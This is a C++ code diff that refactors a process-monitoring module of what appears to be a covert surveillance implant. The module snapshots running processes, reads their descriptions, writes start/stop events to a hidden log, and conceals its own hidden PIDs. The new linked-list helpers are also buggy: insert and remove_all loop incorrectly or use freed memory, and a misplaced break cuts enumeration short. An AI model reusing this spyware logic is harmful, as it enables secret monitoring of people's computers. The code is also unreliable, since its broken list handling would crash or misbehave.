@@ -3,6 +3,7 @@
 #include <Windows.h>
 #include <cJSON/cJSON.h>
 #include <time.h>
+#include <listentry.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/bss.h"
@@ -18,28 +19,122 @@ HANDLE hApplicationThread = NULL;
 
 #define PROC_DESC_LEN 100
 
-typedef struct _application_list_entry_struct {
+typedef struct _application_entry
+{
+	LIST_ENTRY entry;
 	BOOL is_free;
 	WCHAR proc_name[50];
 	WCHAR proc_desc[PROC_DESC_LEN];
 	DWORD PID;
 	BOOL is_hidden;
 	BOOL still_present;
-} APPLICATION_LIST_ENTRY;
+} APPLICATION_ENTRY;
 
-APPLICATION_LIST_ENTRY *g_application_list = NULL;
-DWORD g_application_count = 0;
-
-void GetProcessDescription(DWORD PID, WCHAR *description, DWORD desc_len_in_word)
+struct LANGANDCODEPAGE
 {
-	struct LANGANDCODEPAGE {
-	  WORD wLanguage;
-	  WORD wCodePage;
-	} *lpTranslate;
+	WORD wLanguage;
+	WORD wCodePage;
+};
+
+static LIST_ENTRY entries = { &entries, &entries };
+
+template<typename T, typename Fn, typename... Args>
+T* find_entry_in_list(LIST_ENTRY* head, Fn f, Args... args)
+{
+	LIST_ENTRY* entry = head->Flink;
+
+	while (entry != head)
+	{
+		T* curr = CONTAINING_RECORD(entry, T, entry);
+		if (f(curr, args...))
+			return curr;
+
+		entry = entry->Flink;
+	}
+
+	return NULL;
+}
+
+template<typename T, typename Fn>
+void apply_in_list(LIST_ENTRY* head, Fn f)
+{
+	LIST_ENTRY* entry = head->Flink;
+
+	while (entry != head)
+	{
+		T* curr = CONTAINING_RECORD(entry, T, entry);
+		f(curr);
+		entry = entry->Flink;
+	}
+
+	return;
+}
+
+template<typename T, typename Fn>
+void search_and_change(LIST_ENTRY* head, Fn search, Fn transform)
+{
+	LIST_ENTRY* entry = head->Flink;
+
+	while (entry != head)
+	{
+		T* curr = CONTAINING_RECORD(entry, T, entry);
+		if (search(curr))
+			transform(curr);
+
+		entry = entry->Flink;
+	}
+
+	return;
+}
+
+
+template<typename T, typename Fn>
+void remove_all(LIST_ENTRY* head, Fn dealloc)
+{
+	LIST_ENTRY* entry = head->Flink;
+	
+	while (entry != head)
+	{
+		T* curr = CONTAINING_RECORD(entry, T, entry);
+
+		RemoveEntryList(entry);
+		dealloc((void *)curr);
+	}
+}
+
+template<typename T>
+void insert(LIST_ENTRY* head, T* value)
+{
+	LIST_ENTRY* entry = head->Flink;
+
+	while (entry != head)
+	{
+		InsertTailList(head, &value->entry);
+	}
+}
+
+size_t list_size(LIST_ENTRY* head)
+{
+	size_t i = 0;
+
+	LIST_ENTRY* entry = head->Flink;
+
+	while (entry != head)
+	{
+		i++;
+		entry = entry->Flink;
+	}
+
+	return i;
+}
+
+static void GetProcessDescription(DWORD PID, WCHAR *description, DWORD desc_len_in_word)
+{
+	struct LANGANDCODEPAGE* lpTranslate;
 
 	UINT cbTranslate = 0, cbDesc = 0;
-	HANDLE hproc;
-	BYTE *file_info;
+	HANDLE hproc = NULL;
+	BYTE* file_info = NULL;
 	WCHAR *desc_ptr;
 	DWORD info_size, dummy;
 	WCHAR process_path[MAX_PATH+1];
@@ -48,41 +143,57 @@ void GetProcessDescription(DWORD PID, WCHAR *description, DWORD desc_len_in_word
 	// Se non riesce a prendere la desc, torna una stringa vuota
 	if (desc_len_in_word > 0)
 		description[0] = 0;
-
-	if ( (hproc = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID)) == NULL ) 
-		return;
-
-	if (FNC(GetModuleFileNameExW)(hproc, NULL, process_path, sizeof(process_path)/sizeof(WCHAR)) == 0) {
-		CloseHandle(hproc);
-		return;
-	}
-	CloseHandle(hproc);
-
-	if ( (info_size = FNC(GetFileVersionInfoSizeW)(process_path, &dummy)) == 0 )
-		return;
-	if ( (file_info = (BYTE *)malloc(info_size)) == NULL )
-		return;
-	if (!FNC(GetFileVersionInfoW)(process_path, NULL, info_size, file_info)) {
-		free(file_info);
-		return;
-	}
 	
-	if (!FNC(VerQueryValueW)(file_info, L"\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &cbTranslate) || cbTranslate < sizeof(struct LANGANDCODEPAGE)) {
+	do
+	{
+		if ((hproc = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID)) == NULL)
+			break;
+
+		if (FNC(GetModuleFileNameExW)(hproc, NULL, process_path, sizeof(process_path) / sizeof(WCHAR)) == 0)
+			break;
+
+		if ((info_size = FNC(GetFileVersionInfoSizeW)(process_path, &dummy)) == 0)
+			break;
+
+		if ((file_info = (BYTE*)malloc(info_size)) == NULL)
+			break;
+
+		if (!FNC(GetFileVersionInfoW)(process_path, NULL, info_size, file_info))
+			break;
+
+		if (!FNC(VerQueryValueW)(file_info, L"\\VarFileInfo\\Translation", (LPVOID*)&lpTranslate, &cbTranslate) || cbTranslate < sizeof(struct LANGANDCODEPAGE))
+			break;
+
+		swprintf_s(file_desc_name, sizeof(file_desc_name) / sizeof(WCHAR), L"\\StringFileInfo\\%04x%04x\\FileDescription", lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
+
+		if (FNC(VerQueryValueW)(file_info, file_desc_name, (LPVOID*)&desc_ptr, &cbDesc) && cbDesc > 0)
+			_snwprintf_s(description, desc_len_in_word, _TRUNCATE, L"%s", desc_ptr);
+
+	} while (false);
+
+	if (hproc != NULL)
+		CloseHandle(hproc);
+
+	if (file_info != NULL)
 		free(file_info);
-		return;
-	}
-	swprintf_s(file_desc_name, sizeof(file_desc_name)/sizeof(WCHAR), L"\\StringFileInfo\\%04x%04x\\FileDescription", lpTranslate[0].wLanguage, lpTranslate[0].wCodePage);
-
-	if (FNC(VerQueryValueW)(file_info, file_desc_name, (LPVOID *)&desc_ptr, &cbDesc) && cbDesc>0) 
-		_snwprintf_s(description, desc_len_in_word, _TRUNCATE, L"%s", desc_ptr);		
-
-	free(file_info);
 }
 
-BOOL ApplicationInsertInList(WCHAR *proc_name, WCHAR *proc_desc, DWORD PID)
+static bool is_free(APPLICATION_ENTRY* entry)
 {
-	DWORD i;
-	APPLICATION_LIST_ENTRY *temp_array = NULL;
+	if (entry->is_free)
+		return true;
+
+	return false;
+}
+
+static void reset_still_present(APPLICATION_ENTRY* entry)
+{
+	entry->still_present = FALSE;
+}
+
+static BOOL ApplicationInsertInList(WCHAR *proc_name, WCHAR *proc_desc, DWORD PID)
+{
+	APPLICATION_ENTRY *temp_array = NULL;
 	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 	BOOL is_hidden = FALSE;
 
@@ -90,43 +201,38 @@ BOOL ApplicationInsertInList(WCHAR *proc_name, WCHAR *proc_desc, DWORD PID)
 	if (AM_IsHidden(HIDE_PID, &pid_hide))
 		is_hidden = TRUE;
 
-	// Cerca di inserirlo in un elemento libero 
-	for (i=0; i<g_application_count; i++) {
-		if (g_application_list[i].is_free) {
-			_snwprintf_s(g_application_list[i].proc_name, sizeof(g_application_list[i].proc_name)/sizeof(WCHAR), _TRUNCATE, L"%s", proc_name);		
-			_snwprintf_s(g_application_list[i].proc_desc, sizeof(g_application_list[i].proc_desc)/sizeof(WCHAR), _TRUNCATE, L"%s", proc_desc);		
-			g_application_list[i].PID = PID;
-			g_application_list[i].still_present = TRUE;
-			g_application_list[i].is_hidden = is_hidden;
-			g_application_list[i].is_free = FALSE;
+	APPLICATION_ENTRY* temp = find_entry_in_list<APPLICATION_ENTRY>(&entries, is_free);
 
-			if (is_hidden)
-				return FALSE; //Non lo fa scrivere nel log
-			return TRUE;
-		}
+	if (temp != NULL) // Cerca di inserirlo in un elemento libero 
+	{
+		_snwprintf_s(temp->proc_name, sizeof(temp->proc_name) / sizeof(WCHAR), _TRUNCATE, L"%s", proc_name);
+		_snwprintf_s(temp->proc_desc, sizeof(temp->proc_desc) / sizeof(WCHAR), _TRUNCATE, L"%s", proc_desc);
+		temp->PID = PID;
+		temp->still_present = TRUE;
+		temp->is_hidden = is_hidden;
+		temp->is_free = FALSE;
+		return !is_hidden;	// if it's true, do not write into the log
 	}
 
-	// Altrimenti rialloca il buffer ingrandendolo
-	if ( !(temp_array = (APPLICATION_LIST_ENTRY *)realloc(g_application_list, (g_application_count+1)*sizeof(APPLICATION_LIST_ENTRY))) )
-		return FALSE;
-	
-	i = g_application_count;
-	g_application_list = temp_array;
-	g_application_count++;
+	temp = (APPLICATION_ENTRY *)malloc(sizeof(APPLICATION_ENTRY));
+	if (temp != NULL)
+	{
+		_snwprintf_s(temp->proc_name, sizeof(temp->proc_name) / sizeof(WCHAR), _TRUNCATE, L"%s", proc_name);
+		_snwprintf_s(temp->proc_desc, sizeof(temp->proc_desc) / sizeof(WCHAR), _TRUNCATE, L"%s", proc_desc);
+		temp->PID = PID;
+		temp->still_present = TRUE;
+		temp->is_hidden = is_hidden;
+		temp->is_free = FALSE;
 
-	_snwprintf_s(g_application_list[i].proc_name, sizeof(g_application_list[i].proc_name)/sizeof(WCHAR), _TRUNCATE, L"%s", proc_name);		
-	_snwprintf_s(g_application_list[i].proc_desc, sizeof(g_application_list[i].proc_desc)/sizeof(WCHAR), _TRUNCATE, L"%s", proc_desc);		
-	g_application_list[i].PID = PID;
-	g_application_list[i].still_present = TRUE;
-	g_application_list[i].is_hidden = is_hidden;
-	g_application_list[i].is_free = FALSE;
+		insert(&entries, temp);
+		
+		return !is_hidden; //Non lo fa scrivere nel log
+	}
 
-	if (is_hidden)
-		return FALSE; //Non lo fa scrivere nel log
-	return TRUE;
+	return FALSE;
 }
 
-void ReportApplication(WCHAR *proc_name, WCHAR *proc_desc, BOOL is_started)
+static void ReportApplication(WCHAR *proc_name, WCHAR *proc_desc, BOOL is_started)
 {
 	// Costruisce e scrive il log sequenziale
 	bin_buf tolog;
@@ -138,34 +244,55 @@ void ReportApplication(WCHAR *proc_name, WCHAR *proc_desc, BOOL is_started)
 		return;
 
 	GET_TIME(tstamp);
-	tolog.add(&tstamp, sizeof(tstamp));
-	tolog.add(proc_name);
-	if (is_started)
-		tolog.add(L"START");
-	else
-		tolog.add(L"STOP");
-	tolog.add(proc_desc);
-	tolog.add(&delimiter, sizeof(DWORD));
+	
+	write_buff(tolog, &tstamp);
+	write_buff(tolog, proc_name);
+	
+	write_buff(tolog, (is_started) ? L"START" : L"STOP");
+	write_buff(tolog, proc_desc);
+	write_buff(tolog, &delimiter);
+
 	LOG_ReportLog(PM_APPLICATIONAGENT, tolog.get_buf(), tolog.get_len());
 }
 
-DWORD WINAPI MonitorNewApps(DWORD dummy)
+static bool search_by_pid(APPLICATION_ENTRY* entry, DWORD dwPid)
+{
+	if (entry->PID == dwPid && entry->is_free == FALSE)
+		return true;
+
+	return false;
+}
+
+static bool not_present(APPLICATION_ENTRY* entry)
+{
+	if (entry->is_free == FALSE && entry->still_present == FALSE)
+		return true;
+
+	return false;
+}
+
+static bool report_and_reset(APPLICATION_ENTRY* entry)
+{
+	ReportApplication(entry->proc_name, entry->proc_desc, FALSE);
+	entry->is_free = TRUE;
+	return true;
+}
+
+static DWORD WINAPI MonitorNewApps(DWORD dummy)
 {
 	HANDLE proc_list;
 	PROCESSENTRY32W lppe;
-	DWORD i;
 	BOOL first_loop = FALSE;
 	BOOL proc_found;
 	WCHAR proc_desc[PROC_DESC_LEN];
 
 	// Alla prima passata costruisce la lista (senza riportare i delta)
-	if (!g_application_list)
+	if (list_size(&entries) == 0)
 		first_loop = TRUE; 
 
-	LOOP {
+	LOOP{
 		// Resetta a tutti i processi il flag per vedere quelli che ci sono ancora
-		for (i=0; i<g_application_count; i++)
-			g_application_list[i].still_present = FALSE;
+		apply_in_list<APPLICATION_ENTRY>(&entries, reset_still_present);
 
 		// Cicla i processi attivi 
 		if ( (proc_list = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL)) != INVALID_HANDLE_VALUE ) {
@@ -173,15 +300,16 @@ DWORD WINAPI MonitorNewApps(DWORD dummy)
 			if (FNC(Process32FirstW)(proc_list,  &lppe)) {
 				do {
 					proc_found = FALSE;
-					// Vede se e' gia' in lista
-					for (i=0; i<g_application_count; i++) {
-						// lo marca come presente
-						if (!g_application_list[i].is_free && g_application_list[i].PID == lppe.th32ProcessID) {
-							proc_found = TRUE;
-							g_application_list[i].still_present = TRUE;
-							break;
-						}
+
+					APPLICATION_ENTRY* in_list = find_entry_in_list<APPLICATION_ENTRY>(&entries, search_by_pid, lppe.th32ProcessID);
+
+					if (in_list)
+					{
+						in_list->still_present = TRUE;
+						proc_found = TRUE;
+						break;
 					}
+
 					// altrimenti lo aggiunge
 					if (!proc_found) {
 						GetProcessDescription(lppe.th32ProcessID, proc_desc, PROC_DESC_LEN);
@@ -193,14 +321,7 @@ DWORD WINAPI MonitorNewApps(DWORD dummy)
 			CloseHandle(proc_list);
 		}
 
-		// Riporta e cancella i processi che non sono piu' presenti
-		for (i=0; i<g_application_count; i++) {
-			if (!g_application_list[i].is_free && !g_application_list[i].still_present) {
-				if (!g_application_list[i].is_hidden)
-					ReportApplication(g_application_list[i].proc_name, g_application_list[i].proc_desc, FALSE);
-				g_application_list[i].is_free = TRUE;
-			}
-		}
+		search_and_change<APPLICATION_ENTRY>(&entries, not_present, report_and_reset);
 
 		first_loop = FALSE;
 		CANCELLATION_POINT(bPM_appcp);
@@ -208,8 +329,7 @@ DWORD WINAPI MonitorNewApps(DWORD dummy)
 	}
 }
 
-
-DWORD WINAPI PM_ApplicationStartStop(BOOL bStartFlag, BOOL bReset)
+static DWORD WINAPI PM_ApplicationStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	DWORD dummy;
 
@@ -226,8 +346,7 @@ DWORD WINAPI PM_ApplicationStartStop(BOOL bStartFlag, BOOL bReset)
 
 		// Solo se e' stato stoppato esplicitamente cancella la lista 
 		if (bReset) {
-			SAFE_FREE(g_application_list);
-			g_application_count = 0;
+			remove_all<APPLICATION_ENTRY>(&entries, free);
 		}
 	}
 
@@ -236,12 +355,10 @@ DWORD WINAPI PM_ApplicationStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-
-DWORD WINAPI PM_ApplicationInit(cJSON* elem)
+static DWORD WINAPI PM_ApplicationInit(cJSON* elem)
 {
 	return 1;
 }
-
 
 void PM_ApplicationRegister()
 {
